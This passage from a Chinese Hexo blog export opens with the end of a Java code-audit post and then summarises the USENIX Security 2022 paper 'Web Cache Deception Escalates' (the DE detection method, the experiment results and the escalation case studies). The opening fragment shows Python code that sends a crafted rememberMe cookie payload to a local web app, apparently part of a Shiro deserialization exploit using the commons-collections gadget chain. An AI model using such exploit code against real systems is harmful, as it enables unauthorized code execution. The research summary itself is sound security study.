    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"rememberMe={}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>payload1<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"rememberMe"</span><span class="token operator">:</span> payload<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8080/web_war/"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用CC3（commons-collections3.2.1版本）</p>
]]></content>
      <categories>
        <category>Java代码审计</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Cache Deception Escalates</title>
    <url>/2022/10/07/web-cache-deception-escalates/</url>
    <content><![CDATA[<h1 id="Web-Cache-Deception-Escalates"><a href="#Web-Cache-Deception-Escalates" class="headerlink" title="Web Cache Deception Escalates"></a>Web Cache Deception Escalates</h1><p>web Cache攻击前置知识：</p>
<p><a href="https://websec.readthedocs.io/zh/latest/vuln/webcache.html">https://websec.readthedocs.io/zh/latest/vuln/webcache.html</a></p>
<p>这种攻击类似于RPO（Relative Rath Overwrite）相对路径覆盖：</p>
<p><a href="https://www.freebuf.com/articles/web/166731.html"></a></p>
<p><a href="https://www.notion.so/HTTP-4aaae20b6d8141f390ad4834f6fb84d6">HTTPS请求走私</a>(HTTP request smuggling, HRS)</p>
<p>主要影响的是CDN，负载均衡，反向代理</p>
<h2 id="Usenix2022"><a href="#Usenix2022" class="headerlink" title="Usenix2022"></a>Usenix2022</h2><p>Web Cache Deception Escalates，原文地址如下:</p>
<p><a href="https://www.usenix.org/conference/usenixsecurity22/presentation/mirheidari">https://www.usenix.org/conference/usenixsecurity22/presentation/mirheidari</a></p>
<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>传统的WCD</p>
<p>（Omer Gile blackhat 2017）</p>
<p><a href="https://www.youtube.com/watch?v=mroq9eHFOIU">Web Cache Deception Attack</a></p>
<p>（USENIX Security 2020 paper title “Cached and Confused: Web Cache Deception in the Wild”）具有两个局限性</p>
<p><a href="https://securitygossip.com/blog/2020/04/07/cached-and-confused-web-cache-deception-in-the-wild/">Cached and Confused Web Cache Deception in the Wild - Group of Software Security In Progress</a></p>
<p>1.It cannot probe websites that do not present avenues for marker injection or reﬂection.</p>
<p>1.它不能探测那些没有标记注入或反射渠道的网站</p>
<p>2.Marker setup is a burdensome process, making large-scale measurements infeasible.</p>
<p>2.建立标记是一个繁琐的过程，似的大规模的标记不可行</p>
<h2 id="导言"><a href="#导言" class="headerlink" title="导言"></a>导言</h2><p>传统的方法只能调查一些对身份验证后门保护的用户提供的个人信息的攻击，但这种方法的局限性在于：</p>
<p>1.不能测试没有用户输入的页面，因为没有一个注入的途径。另外在不需要身份验证的页面中或者不支持创建用户的网站上，存在许多的安全信息（CSRF tokens，CSP nonces， OAuth state parameters）这种时候，现有的一些方法无法检测这些网站，因此更无法测试可能包含的WCD漏洞。</p>
<p>2.给予标记的检测方法需要在每个测试的网站上去创建和填充用户账户，这是一个很大的工作量，会给实验带来很大的障碍。</p>
<p>In this paper, we set out to propose a WCD detection methodology that is not hindered by the attack surface coverage and scalability limitations of the previous work. We subsequently aim to gain new insights into the severity and spread of WCD attacks.</p>
<h3 id="新方法："><a href="#新方法：" class="headerlink" title="新方法："></a>新方法：</h3><p>使用内容相似度检查和启发式HTTP相应头来代替标记。这代表可以不用进行手动标记</p>
<h3 id="贡献："><a href="#贡献：" class="headerlink" title="贡献："></a>贡献：</h3><ul>
<li>We present a novel methodology DE to detect WCD vulnerabilities. DE addresses the coverage and scalability limitations of the state-of-the-art approach for detecting WCD in the wild.</li>
<li>We conduct a comparative experiment on 404 websites, evaluating the pros and cons of   different WCD detection methodologies. We show that our approach DE significantly outperforms CC.</li>
<li>We perform the largest-scale measurement experiment to date for detecting WCD in the wild, testing 10K websites. We identify 1188 vulnerable websites.</li>
<li>We discuss case studies on real-life vulnerabilities impacting high-profile websites, presenting evidence for the first time that WCD attacks pose a serious threat beyond leaking personal information.</li>
</ul>
<h2 id="Cached-and-Confused-CC"><a href="#Cached-and-Confused-CC" class="headerlink" title="Cached and Confused(CC)"></a>Cached and Confused(CC)</h2><p>在USENIX Security 2020 的文章 “Cached and Confused: Web Cache Deception in the Wild”中提出的WCD检测方法如下：</p>
<ol>
<li>测试人员在网站上创建一个账户，并使用唯一标记填充用户可编辑的字段，这些字段通常包含个人或一些敏感信息</li>
<li>带有有效身份验证Cookie的爬虫使用WCD漏洞测试网站的页面。此爬虫模拟登陆的受害者点击包含WCD payload的URL</li>
<li>第二个爬虫不对站点进行身份验证，请求上一步中受害者的相同页面，此爬虫模拟攻击者探测成功的漏洞。如果响应中包含标记，则上一步中的漏洞之一被成功的将缓存存到存储页中，将信息暴露给未经身份验证的请求</li>
</ol>
<p>CC的限制：当被测试的页面不反应用户输入（标记）时CC对网站的缓存不具有可见性。甚至一些网站可能不存在标记注入的途径。因此CC是放弃了一些检测漏洞的机会，以确保在有标记的页面上获得更可靠的结果。</p>
<h2 id="Author-Motivation-amp-Goals"><a href="#Author-Motivation-amp-Goals" class="headerlink" title="Author Motivation &amp; Goals"></a>Author Motivation &amp; Goals</h2><p>本篇文章主要研究之前的局限性。提出了一种新的检测方法：Web Cache Deception Escalates(DE)，这种方法主要解决了以下限制：</p>
<ol>
<li>覆盖问题(Coverage Problem)。CC不能测试不反映标记的网页</li>
<li>可扩展性问题(Scalability Problem)。CC需要手动创建账户，标记等一系列的先决条件，人工成本较大</li>
</ol>
<p>Q1: DE方法如何实现，与CC方法的相对表现如何？</p>
<p>Q2:将测量范围扩大到10K网站将如何改变我们对WCD的既定理解？</p>
<p>Q3:WCD除了泄漏个人信息外还有什么？错误的缓存其他类型的敏感数据，特别是在那些公共页面上发现的不受身份验证保护的数据是否可行？</p>
<p>Web cache poisoning</p>
<p>a set of such attacks on popular caching proxies , and more recently introduced more advanced attacks exploiting the cache key construction mechanisms used by these technologies</p>
<p>Nguyen et al. proposed a different take on cache poisoning, employing erroneous negative caching (i.e., caching of error responses) as a means to block access to websites, resulting in a denial-of-service attack</p>
<p>目前还没有普遍适用的缓存攻击或检测防御</p>
<h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>DE使用内容相似度检查和标题检查相结合来克服CC的局限性。但是DE可能不如CC直观</p>
<p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_17.07.18.png" alt="截屏2022-09-11 17.07.18.png"></p>
<h3 id="step-1-检查URL是否返回动态内容？"><a href="#step-1-检查URL是否返回动态内容？" class="headerlink" title="step 1 检查URL是否返回动态内容？"></a>step 1 检查URL是否返回动态内容？</h3><p>WCD的前提是诱使缓存存储动态生成的内容，因为静态页面不太可能包含敏感数据。因此，作为第一步，我们请求两次URL，每一次都有一个新的客户机状态，并比较响应。如果结果相同，我们认为这是一个静态页面，终止程序，否则进行step 2</p>
<h3 id="step-2-当我们发起WCD攻击时，服务器是否仍然以动态内容进行相应？"><a href="#step-2-当我们发起WCD攻击时，服务器是否仍然以动态内容进行相应？" class="headerlink" title="step 2 当我们发起WCD攻击时，服务器是否仍然以动态内容进行相应？"></a>step 2 当我们发起WCD攻击时，服务器是否仍然以动态内容进行相应？</h3><p>step2是通过使用WCD有效负载修改输入URL来创建攻击URL，并请求它来发起WCD攻击。</p>
<ol>
<li>向URL去追加一个PATH组件，它指向一个不存在的样式表。我们将文件名随机化，以防止Internet用户无意间访问相同的URL并获取中毒的缓存内容。作者在payload中仍然使用了CSS扩展。（虽然其他静态文件扩展名也可以工作，但是几乎所有网站都存在样式表，这使它成为了WCD攻击的首选）</li>
<li>通过请求这个URL，模拟受害者访问该链接，进行WCD尝试。这里主要考虑的问题是确保服务器仍然用动态内容相应请求。eg：如果攻击失败，服务器一般会返回错误页（404，400）。为了解决这个问题，作者生成两个具有随机有效负载的唯一攻击URL，发起两次攻击（6，7）行并比较结果（第8行），如果结果相同，则表示攻击失败，终止测试。</li>
</ol>
<h3 id="step-3-攻击URL的源相应是否可缓存"><a href="#step-3-攻击URL的源相应是否可缓存" class="headerlink" title="step 3 攻击URL的源相应是否可缓存"></a>step 3 攻击URL的源相应是否可缓存</h3><p>WCD想要成功，源服务器必须提供一个错误的缓存的动态响应。进一步说，但对相同攻击的URL的进一步请求必须从缓存中提供。</p>
<p>在最后一步中，我们通过检查首次访问攻击URL时返回的HTTP相应（第6行）和对同一URL的重复请求的响应（第9行）来精确执行此检查。具体来说就是执行了两次检查。首先我们使用HTTP相应头启发式来验证初始请求时缓存但未命中（它是由原始请求提供的），但后一个请求是缓存命中（第8行和第10行）接下来比较响应体，已验证这两个请求是否相同（第10行第一个条件），主要是保证正确性。</p>
<h2 id="Interpreting-the-Results"><a href="#Interpreting-the-Results" class="headerlink" title="Interpreting the Results"></a>Interpreting the Results</h2><p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_17.36.15.png" alt="截屏2022-09-11 17.36.15.png"></p>
<p>不一定必须是用户的标记，在一些非敏感页面，包括一些日期，服务器响应时间或电子邮件混淆字符串的动态部分</p>
<p>但是，动态页面也有可能会被网站管理员配置为可缓存。即使正常请求时，页面也可能会被缓存，而不会收到WCD攻击。这可能是由于一些服务器的优化。例如，可以允许一些不敏感的动态对象中从缓存提供服务，例如一个短TTL，即使他已经超时了。</p>
<p>DE相比于CC的一个优势是他可以进行假阳性的自动识别和删除，而不需要人工分析</p>
<p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_17.43.24.png" alt="截屏2022-09-11 17.43.24.png"></p>
<p>将每一个URL都视为易受攻击，通常会请求它两次，而不使用WCD邮箱负载，并用相同的请求头来测试第二个响应是否来自缓存。缓存命中意味着在没有攻击时URL仍然被缓存，因此是假阳性。</p>
<h2 id="DE-with-Authentication"><a href="#DE-with-Authentication" class="headerlink" title="DE with Authentication"></a>DE with Authentication</h2><p>DE不能访问身份验证后的页面，而CC是专门用来测试这些页面。为了研究协议变化和认证状态对WCD检测效率的影响，引入了第三种方法，称为 $DE_{auth}$</p>
<p>$DE_{auth}$是DE和CC的混合方法。核心使用了新的监测方案，但和CC一样需要手动创建账户，在算法1的6，7行使用有效身份验证的cookie，模拟登录的受害者点击恶意链接。</p>
<h2 id="The-Experiment"><a href="#The-Experiment" class="headerlink" title="The Experiment"></a>The Experiment</h2><p>在每个FQDN上测试了500个url，使用不同的WCD payload，用12个attack url 测试每个页面，4种路径混淆技术，提出了利用URL编码差异进一步设计了7个新的编码技巧。</p>
<p>在Alexa Top 100k中提取了404个网站爬行池，选择这些目标是由于CC的标记要求限制，遵循了Cached and Confused中描述的协议。</p>
<ol>
<li>抓取Alexa Top 100K 的首页，通过搜索包含关键词（如登录注册）和OAuth &amp; OpenID链接参数</li>
<li>手动过滤需要敏感凭据的网站，如需要银行账户或社会安全码来创建账户</li>
<li>得到404个网站，在上面创建账户并标记注入用户的可编辑字段，并为每个字段收集了CC和$DE_{auth}$使用的cookie</li>
</ol>
<p>这个过程一定会产生一个和CC编码相同的数据集，但对分析没有实质性的影响</p>
<p>实践中，爬虫经常会在每个目标网站上发现多个易受攻击的URL，但是如果不对每个发现进行手动分析，我们就无法准确的确定这些漏洞是否真正源于不同的缓存配置问题，或者不同的URL是否实际上对应唯一的页面</p>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>在404个网站中检测到了123个易受WCD攻击的网站</p>
<p>通过实验我们发现之前CC的限制，尽管数据集已经很偏向必须支持标记注入的网站，但许多其他易受攻击的页面没有反映这些标记。事实上CC只能测试244/404个网站，结果CC在我们的实验中只识别了18个易受攻击的网站，而$DE_{auth}$和DE分别识别了115和104个。 $DE_{auth}$的表现更好一些。</p>
<p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_19.57.51.png" alt="截屏2022-09-11 19.57.51.png"></p>
<p>如作者所预料，$DE_{auth}$和DE的差异正式由于身份验证导致的。例如手动确认$DE_{auth}$检测到的目标网站上有漏洞的计费设置页面，但在测试相同URL时，DE被重定向到安全登录页面。同样，CC发现了7个由于访问了经过身份验证页面而DE未检测到的漏洞。另外CC捕获到了两个独特的漏洞，即使是$DE_{auth}$也漏掉了这两个漏洞。证实其中一个案例是由于目标网站没有返回缓存状态头而失败。</p>
<p>最后$DE_{auth}$发现了5个独特的漏洞，都是没有经过身份验证的，经过验证这些情况是由于网站在向请求附加cookie时显示发送阻止缓存的缓存控制头，或悄悄忽略了所有缓存指令</p>
<p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_20.18.47.png" alt="截屏2022-09-11 20.18.47.png"></p>
<p>CC的误报：一个网站如果公开列出了他最近的访问者，其中一个是我们标记的用户名，将会误报</p>
<p>DE是大规模检测的唯一可行选择，具有良好的检测性能和零设置开销。</p>
<p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_21.05.37.png" alt="截屏2022-09-11 21.05.37.png"></p>
<p><img src="/2022/10/07/web-cache-deception-escalates/%25E6%2588%25AA%25E5%25B1%258F2022-09-11_21.06.50.png" alt="截屏2022-09-11 21.06.50.png"></p>
<p>WCD+XSS可能导致前置缓存将响应与XSS payload一起存储，这会将攻击升级到stored XSS，此时注入的恶意payload将自动从缓存提供给访问网站的客户端</p>
<h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><p>供应链攻击不局限于传统的恶意代码包含，单个具有缓存风险的易受攻击的在线服务提供商可能将许多网站暴露在互联网上导致WCD攻击，在结果中发现了大量的易受攻击的URL，它们共享相同的子域和相似的路径组件（eg: support.example.com/common-pattern）经过人工检查，确定这些页面是与流行的客户服务和支持管理平台的集成点。由于供应商平台存在WCD漏洞，他们许多客户也在各自的域下受到影响。在1188个网站中有399个明确表示受到该漏洞的影响。</p>
<p>WCD攻击不能升级为破坏性攻击的原因：</p>
<p>充分分析了24个网站，但没有对攻击者有价值的数据。另外是个网站不允许探索整个应用程序，要么不允许建立公共账户，要么需要私人信息来进行。只有三个网站泄漏了敏感令牌但这本身并不构成重大威胁。例如CSRF攻击由于对推荐人检查和验证码的分层防御被阻止，CSP nonce泄漏因为没有XSS漏洞而无法利用。2个网站通过浏览器端的API提取敏感数据，因此没有缓存任何损坏。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling</strong></p>
<p>blackhat 2022</p>
<p><a href="https://www.blackhat.com/us-22/briefings/schedule/#browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling-26414">https://www.blackhat.com/us-22/briefings/schedule/#browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling-26414</a></p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
